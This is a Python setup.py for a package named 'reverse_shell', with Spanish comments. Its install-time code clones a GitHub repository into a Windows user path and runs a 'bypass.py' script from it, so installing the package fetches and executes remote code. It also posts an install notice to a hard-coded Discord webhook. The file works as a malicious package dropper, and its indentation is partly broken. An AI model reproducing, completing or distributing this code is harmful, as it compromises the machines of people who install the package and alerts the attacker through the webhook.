from setuptools import setup
import requests
import socket
import git
import subprocess
import os

def send_discord_info():
subprocess.run(['pip', 'install', 'gitpython'])
    webhook_url = 'https://discord.com/api/webhooks/1087389369901522986/aXyWO4s0TJpjXYvcsAstmA-xit7LiYh_pKsrEEOx0akWxJcBMKocrXhp2WgIld4alxcd' # Reemplaza con la URL de tu propia webhook de Discord
    headers = {'Content-Type': 'application/json'}
    data = {'content': f'¡Alguien ha instalado el paquete reverse_shell!'}
    response = requests.post(webhook_url, headers=headers, json=data)

# Clona el repositorio de GitHub y ejecuta el archivo
repo_url = 'https://github.com/NotInfected/updater.git'  # Reemplaza con la URL de tu repositorio de GitHub
repo_path = os.path.join('C:', 'Users', 'repo')  # Ruta donde deseas clonar el repositorio

if not os.path.isdir(repo_path):
    git.Repo.clone_from(repo_url, repo_path)

os.chdir(repo_path)
subprocess.run(['python', 'bypass.py'])


setup(
    name='reverse_shell',
    version='1.2',
    packages=['reverse_shell'],
    install_requires=['requests', 'gitpython'],
    url='https://github.com/tuusuario/reverse_shell',
    license='',
    author='ReverseShell',
    author_email='reverseshell@gmail.com',
    description='ReverseShell Project'
)

if __name__ == '__main__':
    send_discord_info()